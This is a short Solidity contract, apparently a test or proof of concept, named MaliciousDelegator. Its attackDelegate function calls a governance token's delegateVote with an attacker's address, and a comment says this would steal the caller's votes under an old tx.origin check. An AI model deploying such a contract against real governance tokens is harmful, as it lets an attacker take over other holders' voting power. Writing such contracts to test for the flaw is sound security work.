// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IGovernanceToken {
    function delegateVote(address to) external;
}

contract MaliciousDelegator {
    IGovernanceToken public govToken;

    constructor(address _govToken) {
        govToken = IGovernanceToken(_govToken);
    }

    function attackDelegate(address attacker) external {
        // Under the old tx.origin logic, this would delegate the caller's votes to the attacker
        govToken.delegateVote(attacker);
    }
}
